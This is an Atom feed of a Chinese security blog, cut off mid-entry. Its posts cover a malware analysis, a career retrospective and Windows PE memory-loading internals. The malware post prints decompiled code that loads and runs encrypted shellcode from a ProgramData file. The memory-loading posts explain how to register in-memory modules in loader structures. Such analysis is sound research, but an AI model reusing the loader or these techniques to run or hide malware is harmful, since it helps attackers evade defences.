<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://citrusice.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://citrusice.github.io/" rel="alternate" type="text/html" /><updated>2024-04-12T18:24:07+08:00</updated><id>https://citrusice.github.io/feed.xml</id><title type="html">Nqd8VId6</title><subtitle>my blog
</subtitle><entry><title type="html">记一次给自己应急</title><link href="https://citrusice.github.io/posts/respond-to-a-hack-for-myself/" rel="alternate" type="text/html" title="记一次给自己应急" /><published>2024-04-12T18:19:58+08:00</published><updated>2024-04-12T18:19:58+08:00</updated><id>https://citrusice.github.io/posts/respond-to-a-hack-for-myself</id><content type="html" xml:base="https://citrusice.github.io/posts/respond-to-a-hack-for-myself/">&lt;p&gt;很久没分析样本了，这次朋友发了个样本过来我看很有意思就想分析一下。但是终究是太自信，也是嫌麻烦，都没有把样本扔虚拟机分析，本机打开 ida 就开始逆向了。然后不出意外的我就手抖不小心把样本跑了起来，于是就有了这篇文章。&lt;/p&gt;

&lt;p&gt;样本是一个带签名的 exe，附带了一个 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dat&lt;/code&gt; 文件，这是最开始吸引我的地方。因为众所周知，一般白加黑都是一个签名 exe 带个黑 dll，而这样本只有个 dat 文件，所以肯定有点意思。经过一通逆向后在样本里找到了很多 lua 相关的字符串，我大概猜到这个白加黑是靠 lua 脚本实现的白加黑了。网上搜了一下这个样本的信息同样确认了这个样本是从 dat 文件提取 lua 脚本执行的，作者会在 lua 脚本中插入执行shellcode 的代码，而这个 dat 文件是一个加密的压缩包。&lt;/p&gt;

&lt;p&gt;知道了大概流程就简单了，直接在相关内存加载相关代码下断 dump 下来 shellcode 做分析。从 dump 出的 shellcode 中翻了一下找到了 mz 头，那么估计就是个内存加载 pe 的代码了：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/Pasted%20image%2020240412173558.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;不过为了安全起见我还是用调试器跟了一遍，确定就是内存加载的代码，然后直接提取出来被内存加载的 pe 分析&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HANDLE sub_10001120()
{
  HANDLE result; // eax
  HANDLE v1; // eax
  DWORD (__stdcall *lpStartAddress)(LPVOID); // [esp+Ch] [ebp-224h]
  WCHAR String1[262]; // [esp+10h] [ebp-220h] BYREF
  LPVOID lpBuffer; // [esp+21Ch] [ebp-14h]
  DWORD NumberOfBytesRead; // [esp+220h] [ebp-10h] BYREF
  HANDLE hFile; // [esp+224h] [ebp-Ch]
  BOOL v7; // [esp+228h] [ebp-8h]
  SIZE_T dwSize; // [esp+22Ch] [ebp-4h]

  lstrcpyW(String1, L&quot;C:\\ProgramData\\templateWatch.dat&quot;);
  result = CreateFileW(String1, 0x80000000, 0, 0, 3u, 0x80u, 0);
  hFile = result;
  if ( result )
  {
    dwSize = GetFileSize(hFile, 0);
    if ( dwSize &amp;gt;= 0x200 &amp;amp;&amp;amp; (lpBuffer = VirtualAlloc(0, dwSize, 0x3000u, 0x40u)) != 0 )
    {
      NumberOfBytesRead = 0;
      v7 = ReadFile(hFile, lpBuffer, dwSize, &amp;amp;NumberOfBytesRead, 0);
      if ( hFile )
      {
        CloseHandle(hFile);
        hFile = 0;
      }
      if ( v7 )
      {
        if ( NumberOfBytesRead == dwSize )
        {
          lpStartAddress = (DWORD (__stdcall *)(LPVOID))((char *)lpBuffer + 256);
          if ( sub_10001020((BYTE *)lpBuffer + 256, dwSize - 256, (BYTE *)lpBuffer, 0x100u) )
          {
            CreateThread(0, 0, lpStartAddress, 0, 0, 0);
            v1 = GetCurrentProcess();
            WaitForSingleObject(v1, 0xFFFFFFFF);
          }
        }
      }
      if ( hFile )
        CloseHandle(hFile);
      result = (HANDLE)VirtualFree(lpBuffer, 0, 0x8000u);
    }
    else
    {
      result = (HANDLE)CloseHandle(hFile);
    }
  }
  return result;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;一览无余的从文件读取 shellcode 然后再加载，然后检查了下本人电脑的这个路径，发现并没有这个文件，safe 了。再问了下朋友确认这个只是整个样本的一部分，应该只是用来维持权限的，安装后门的代码在另外的位置，虚惊一场！&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;我是太想搞安全了，但是没时间，而且区块链这边搞的也不是很顺利。不过看来二进制这块我还没有太生疏，逆完这样本说实话还挺开心的，感觉自己宝刀未老啊。&lt;/p&gt;</content><author><name></name></author><category term="reverse-engineering" /><summary type="html">很久没分析样本了，这次朋友发了个样本过来我看很有意思就想分析一下。但是终究是太自信，也是嫌麻烦，都没有把样本扔虚拟机分析，本机打开 ida 就开始逆向了。然后不出意外的我就手抖不小心把样本跑了起来，于是就有了这篇文章。</summary></entry><entry><title type="html">五年总结</title><link href="https://citrusice.github.io/posts/five-years-summary/" rel="alternate" type="text/html" title="五年总结" /><published>2024-01-22T10:48:25+08:00</published><updated>2024-01-22T10:48:25+08:00</updated><id>https://citrusice.github.io/posts/five-years-summary</id><content type="html" xml:base="https://citrusice.github.io/posts/five-years-summary/">&lt;p&gt;搞安全五年了，一直想着在五年结束后写一个五年总结，但是我的安全路却在第五年暂时中止了，虽然说区块链也有区块链安全，但我搞的东西跟安全没啥关系，所以并没有五年，就算个4.5年吧。&lt;/p&gt;

&lt;p&gt;其实本来第三年的时候就想写个总结了，但是第三年的时候感觉自己也没有太多东西，而且那时候好像也把写总结这事忘了，转眼已经到了第四年下半年。等到第四年结束的时候想起来，又觉得第四年这数字不上不下的，干脆第五年再写吧，却没想到第五年是这般模样。&lt;/p&gt;

&lt;p&gt;第一年搞安全基本都是在搞web相关的，渗透和ctf都搞搞，临近年末的时候还学了一下pwn，不过只有栈溢出水平。初学安全最多的感触是迷茫，我相信这是每个对黑客技术感兴趣的人在初学时都会感受到的。一方面来自于不知道怎么学，另一方面我也找不到真正学习黑客技术的圈子。如果现在有人问我怎么去成为一个黑客，或者怎么学习黑客技术，我能告诉他先需要学什么什么，去哪些论坛、加入哪些圈子等等。可是在我初学的时候，我能知道的就是去百度“黑客”这两个关键字，而搜到的都是一些垃圾内容，比如什么打着“红客”旗号招摇撞骗的团队，又或者是知乎上为了博眼球看起来好像很厉害的娱乐圈脚本小子。总之最初的一段时间确实很迷茫，但是慢慢认识了一些朋友，一起研究渗透，打ctf什么的，相当开心。但正如不知名普通人百顺所说——前进的道路上总是孤独的。当学习的知识愈发深入，会发现根本没人可以交流，只有网上撩撩几段文字作伴，甚至没有文档。不过这就是后话了。&lt;/p&gt;

&lt;p&gt;第二年接触到了免杀，因为有一次渗透的时候马被360干掉了。由此就开始学习windows编程、pe结构之类的东西，就想着写内存加载做个自动化免杀的东西（不过直到两年后我才知道真正想自动化免杀该怎么做）。之后的话到了一个做安全的公司实习，见识了一下真正红队干的事，还精进了一下逆向技能。&lt;/p&gt;

&lt;p&gt;第三年正式工作的时候才真正下定决心，专注搞二进制，不再想着搞什么渗透/javaweb之类的东西了。之后两年就是学习探索windows的各方面，当然还深入的研究了一些杀毒软件。&lt;/p&gt;

&lt;p&gt;最后一年就转去做区块链了，深入学了很多区块链的知识，但是目前仍然是前途无亮，希望今年能有好转吧。而且长期的打算我还是要做安全的。&lt;/p&gt;

&lt;p&gt;回顾一下这几年，花时间做大量逆向是对我有最多提升的部分，这里逆向的目标主要是一些 windows 系统组件，或者一些软件/驱动的内部实现。另外一方面的提升来自于写一些中小型的项目，搞安全的人多是写一些小脚本，代码能力还是偏弱的，写一些中小型的项目提升了我很多代码能力。学安全这几年最遗憾的是没有真正去挖漏洞，虽然之前做过一些漏洞研究，但仍然跟漏洞无缘。我觉得挖漏洞对于我来说就像个徽章吧，证明我是个黑客，这种感觉，所以之后还是一定要挖一个出来。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;半年没写文章了，新工作挺忙，就算想写点什么也没有精力去研究。对于工作还是应该构建一个安全边界，留一点自己的时间，但是这块我做的不好。今年也做了些管理的工作，感觉我不适合当管理。还是想专心搞搞技术。幸运的是我还有时间，还有试错的资本。有点权力固然是好事，但是权力也会带带种种不好的东西。感觉能专心搞技术是种幸福，写到这里不由得又怀念起上家公司了。&lt;/p&gt;</content><author><name></name></author><category term="杂" /><summary type="html">搞安全五年了，一直想着在五年结束后写一个五年总结，但是我的安全路却在第五年暂时中止了，虽然说区块链也有区块链安全，但我搞的东西跟安全没啥关系，所以并没有五年，就算个4.5年吧。 其实本来第三年的时候就想写个总结了，但是第三年的时候感觉自己也没有太多东西，而且那时候好像也把写总结这事忘了，转眼已经到了第四年下半年。等到第四年结束的时候想起来，又觉得第四年这数字不上不下的，干脆第五年再写吧，却没想到第五年是这般模样。 第一年搞安全基本都是在搞web相关的，渗透和ctf都搞搞，临近年末的时候还学了一下pwn，不过只有栈溢出水平。初学安全最多的感触是迷茫，我相信这是每个对黑客技术感兴趣的人在初学时都会感受到的。一方面来自于不知道怎么学，另一方面我也找不到真正学习黑客技术的圈子。如果现在有人问我怎么去成为一个黑客，或者怎么学习黑客技术，我能告诉他先需要学什么什么，去哪些论坛、加入哪些圈子等等。可是在我初学的时候，我能知道的就是去百度“黑客”这两个关键字，而搜到的都是一些垃圾内容，比如什么打着“红客”旗号招摇撞骗的团队，又或者是知乎上为了博眼球看起来好像很厉害的娱乐圈脚本小子。总之最初的一段时间确实很迷茫，但是慢慢认识了一些朋友，一起研究渗透，打ctf什么的，相当开心。但正如不知名普通人百顺所说——前进的道路上总是孤独的。当学习的知识愈发深入，会发现根本没人可以交流，只有网上撩撩几段文字作伴，甚至没有文档。不过这就是后话了。</summary></entry><entry><title type="html">From Memory Loading to Everything - Part 2</title><link href="https://citrusice.github.io/posts/from-memory-loading-to-everything-part-2/" rel="alternate" type="text/html" title="From Memory Loading to Everything - Part 2" /><published>2023-08-29T10:20:56+08:00</published><updated>2023-08-29T10:20:56+08:00</updated><id>https://citrusice.github.io/posts/from-memory-loading-to-everything-part-2</id><content type="html" xml:base="https://citrusice.github.io/posts/from-memory-loading-to-everything-part-2/">&lt;p&gt;上一篇文章中我介绍了 tls 表以及 ldr，本文将介绍资源表、LdrpHashTable、异常表和 MFC 程序加载时出现的问题等相关内容。&lt;/p&gt;

&lt;h1 id=&quot;resource-table&quot;&gt;Resource Table&lt;/h1&gt;

&lt;p&gt;pe 的资源表用于存放资源文件，我们 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FindResourceA&lt;/code&gt; 与 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LoadResource&lt;/code&gt; 来从资源表中获取资源。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FindResourceA&lt;/code&gt; 是依赖 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BasepMapModuleHandle&lt;/code&gt; 获取到 image 的句柄（基址）的，当我们传入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt; 时，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BasepMapModuleHandle&lt;/code&gt; 将取 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtCurrentPeb()-&amp;gt;ImageBaseAddress&lt;/code&gt; 作为返回结果&lt;/p&gt;

&lt;h1 id=&quot;ldrphashtable&quot;&gt;LdrpHashTable&lt;/h1&gt;

&lt;p&gt;编程中往往会用到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetModuleHandle&lt;/code&gt; 找到模块的基址，这跟 LdrpHashTable 有关。&lt;/p&gt;

&lt;p&gt;LdrpHashTable 是一个存放模块列表的 hash 表，而 GetModuleHandle 就是通过这个表进行模块的查询&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;LIST_ENTRY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LdrpHashTable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LDRP_HASH_TABLE_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;LdrDataTableEntry-&amp;gt;HashLink 这个 hashlink 就与一个 listentry 相连接，因此可以通过找到一个模块的 ldrentry 间接找到这个整个 LdrpHashTable。&lt;/p&gt;

&lt;h1 id=&quot;exception-table&quot;&gt;Exception Table&lt;/h1&gt;

&lt;p&gt;x64 的异常与 x86 不同，不再依赖异常链表，而是将异常相关信息写在 pe 的 exception table 中，在 pe 装载后对 exception table 调用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RtlAddFunctionTable&lt;/code&gt; 注册异常。&lt;/p&gt;

&lt;h1 id=&quot;mfc-程序&quot;&gt;MFC 程序&lt;/h1&gt;

&lt;p&gt;尝试加载一下 mfc 程序，发现失败了。研究了一下发现是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetModuldeFileName&lt;/code&gt; 的问题。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetModuldeFileName&lt;/code&gt; 根据传入的 handle 在 InMemoryOrderLinks 链表中寻找对应的 ldr entry，然后返回 entry 中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FullDllName&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;对于内存加载的模块我没有添加对应的 ldr entry，因此导致 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetModuldeFileName&lt;/code&gt; 失败。而如果要添加 ldr entry，由于各个 windows 版本中的 ldr entry 结构并不一样，如何处理以保证兼容性也是一个问题。&lt;/p&gt;

&lt;p&gt;报错的位置：&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetModuleFileNameW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m_hInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x104u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;260&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AfxAssertFailedLine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;D:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;agent&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;_work&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;vctools&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;VC7Libs&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Ship&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ATLMFC&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Src&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;MFC&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;appinit.cpp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;75&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;__debugbreak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:000&amp;gt; k
 # Child-SP          RetAddr               Call Site
00 000000ed`ba2f7958 00007ffd`37294d13     ntdll!RtlPcToFileHeader
01 000000ed`ba2f7960 00000001`40b14d8f     KERNELBASE!GetModuleHandleExW+0x83
02 000000ed`ba2f79a0 00000001`40b17233     encrytStringTool!common_message_window&amp;lt;char&amp;gt;+0x6f [minkernel\crts\ucrt\src\appcrt\misc\dbgrpt.cpp @ 333] 
03 000000ed`ba2f9c30 00000001`40b518dc     encrytStringTool!__acrt_MessageWindowA+0x43 [minkernel\crts\ucrt\src\appcrt\misc\dbgrpt.cpp @ 453] 
04 000000ed`ba2f9c70 00000001`40b170b0     encrytStringTool!_VCrtDbgReportA+0x99c [minkernel\crts\ucrt\src\appcrt\misc\dbgrptt.cpp @ 420] 
05 000000ed`ba2fed60 00000001`404352b4     encrytStringTool!_CrtDbgReport+0x60 [minkernel\crts\ucrt\src\appcrt\misc\dbgrpt.cpp @ 263] 
06 000000ed`ba2fedc0 00000001`40493f70     encrytStringTool!AfxAssertFailedLine+0x94 [C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30037\atlmfc\include\afx.h @ 317] 
07 000000ed`ba2fef60 00000001`40493e03     encrytStringTool!CWinApp::SetCurrentHandles+0x110 [D:\agent\_work\13\s\src\vctools\VC7Libs\Ship\ATLMFC\Src\MFC\appinit.cpp @ 75] 
08 000000ed`ba2ff860 00000001`40baba30     encrytStringTool!AfxWinInit+0xc3 [D:\agent\_work\13\s\src\vctools\VC7Libs\Ship\ATLMFC\Src\MFC\appinit.cpp @ 46] 
09 000000ed`ba2ff8a0 00000001`40bab992     encrytStringTool!AfxWinMain+0x80 [D:\agent\_work\13\s\src\vctools\VC7Libs\Ship\ATLMFC\Src\MFC\winmain.cpp @ 29] 
0a 000000ed`ba2ff960 00000001`40aadd72     encrytStringTool!wWinMain+0x32 [D:\agent\_work\13\s\src\vctools\VC7Libs\Ship\ATLMFC\Src\MFC\appmodul.cpp @ 26] 
0b 000000ed`ba2ff990 00000001`40aadc1e     encrytStringTool!invoke_main+0x32 [D:\agent\_work\13\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 123] 
0c 000000ed`ba2ff9d0 00000001`40aadade     encrytStringTool!__scrt_common_main_seh+0x12e [D:\agent\_work\13\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 288] 
0d 000000ed`ba2ffa40 00000001`40aade0e     encrytStringTool!__scrt_common_main+0xe [D:\agent\_work\13\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 331] 
*** WARNING: Unable to verify checksum for test.exe
0e 000000ed`ba2ffa70 00007ff7`99381ed2     encrytStringTool!wWinMainCRTStartup+0xe [D:\agent\_work\13\s\src\vctools\crt\vcstartup\src\startup\exe_wwinmain.cpp @ 17] 
0f 000000ed`ba2ffaa0 00007ff7`9938256f     test!CallEntry+0xb2 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;深入这个函数，GetModuleFileNameW-&amp;gt;LdrGetDllFullName-&amp;gt;LdrpFindLoadedDllByHandle
最终通过 LdrpModuleBaseAddressIndex 这个东西找到 dllentry。&lt;/p&gt;

&lt;p&gt;继续研究，通过 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LdrpModuleBaseAddressIndex&lt;/code&gt; 的引用找到了函数 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LdrpInsertModuleToIndexLockHeld&lt;/code&gt; ，这个函数处理了 LdrpMappingInfoIndex 和 LdrpModuleBaseAddressIndex，可见这两个东西都是我们需要处理的。&lt;/p&gt;

&lt;p&gt;那么这两个东西到底是个什么结构？在一些逆向以及查找资料后，得知这个东西是个红黑树&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;RtlRbInsertNodeEx((unsigned __int64 *)&amp;amp;LdrpMappingInfoIndex, v7, v8, (unsigned __int64)&amp;amp;a1-&amp;gt;MappingInfoIndexNode);
 result = RtlRbInsertNodeEx(
             (unsigned __int64 *)&amp;amp;LdrpModuleBaseAddressIndex,
             v10,
             v4,
             (unsigned __int64)&amp;amp;a1-&amp;gt;BaseAddressIndexNode);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_RTL_BALANCED_NODE&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_RTL_BALANCED_NODE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Children&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_RTL_BALANCED_NODE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Left&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_RTL_BALANCED_NODE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Right&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;UCHAR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Red&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;UCHAR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Balance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ULONG_PTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ParentValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RTL_BALANCED_NODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PRTL_BALANCED_NODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_RTL_RB_TREE&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;PRTL_BALANCED_NODE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;PRTL_BALANCED_NODE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Min&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RTL_RB_TREE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PRTL_RB_TREE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;搞清楚了这两个东西是个红黑树，那么还需要知道这两个结构存的是什么内容的数据，继续逆向，得知 ldr data table entry 的 MappingInfoIndexNode 对应的 LdrpMappingInfoIndex，BaseAddressIndexNode 对应 LdrpModuleBaseAddressIndex。&lt;/p&gt;

&lt;p&gt;红黑树的节点是可以通过 ParentValue 找到父节点的，因此定位到一棵树的 root 是可以做到，只要能找到任意一个节点就可以追寻到 root。定位到 root 以后直接调用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RtlRbInsertNodeEx&lt;/code&gt; 即可。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;断断续续总算是把这篇文章弄完了。由于实在是没有精力，脑子里根本构建不出整个文章的思路，所以写得很散，只是潜意识觉得文章应该有什么就把该有的堆上去，还请见谅。&lt;/p&gt;

&lt;p&gt;搞区块链以后常常会后悔，因为自己抛弃了一个安逸的环境。虽然这些后悔是我早已预料的，但是我还是高估了我对变化的环境的承受能力，我往往感到精疲力尽，并在想如果我当时没有做出这样的选择，我应该沉浸在 ida 和 windows 的世界里，享受轻松无压力的生活。尽管有一些言论是说“让自己走出舒适区”，但我却并不认同。只要这个舒适区是可持续的，那么一直待在里面没有什么不好。不过，虽然我嘴上是不认同这种观点，但是我实际的选择上却是倾向于认同的，也许是因为我还是想做一点事才这样选择。&lt;/p&gt;

&lt;p&gt;博客我还是会尽力写，因为一方面我不想说让我二进制这块的学习就这样停滞，另外我也仍然想在安全这块有所成就，不过写的速度是不会像以前那样一个月一篇了。不过也无所谓，贵在坚持。&lt;/p&gt;</content><author><name></name></author><category term="windows" /><summary type="html">上一篇文章中我介绍了 tls 表以及 ldr，本文将介绍资源表、LdrpHashTable、异常表和 MFC 程序加载时出现的问题等相关内容。</summary></entry><entry><title type="html">From Memory Loading to Everything - Part 1</title><link href="https://citrusice.github.io/posts/from-memory-loading-to-everyting-part-1/" rel="alternate" type="text/html" title="From Memory Loading to Everything - Part 1" /><published>2023-05-20T11:02:16+08:00</published><updated>2023-05-20T11:02:16+08:00</updated><id>https://citrusice.github.io/posts/from-memory-loading-to-everyting-part-1</id><content type="html" 